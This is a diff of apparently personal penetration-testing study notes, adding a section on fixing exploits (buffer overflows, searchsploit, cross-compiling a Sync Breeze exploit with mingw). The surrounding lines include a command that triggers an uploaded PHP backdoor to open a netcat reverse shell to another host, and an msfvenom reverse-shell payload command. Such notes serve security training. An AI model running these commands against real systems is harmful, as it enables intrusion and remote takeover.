@@ -590,8 +590,22 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   19. Start reverse shell  
       `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.160 6666 -e /bin/bash"`  
   20. generate the exploit payload (optional)  
-      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`  
-### 14. Fixing exploits
+      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`
+      
+### 14. Fixing exploits  
+- buffer overflow  
+ - **heap** is dynamically managed and typically stores large chunks of globally accessible data  
+ - **stack**'s purpose is to store local functions' data, and its size is generally fixed  
+ - overwriting the return address with a JMP ESP instruction, which instructs the program to jump to the stack and execute the shellcode
+- importing and examing the exploit    
+ - `searchsploit "Sync Breeze Enterprise 10.0.28"`
+- Cross-compiling exploit code
+  - `sudo apt install mingw-w64`: mingw-w64 cross-compiler in Kali
+  - compile the code into a Windows Portable Executable (PE)
+  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` > error
+  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` : missing linker to find the winsock library (fixed)
+- ddd
+- dd
 ### 15. Antivirus evasion
 ### 16. Password attacks
     - confirm ssh service running
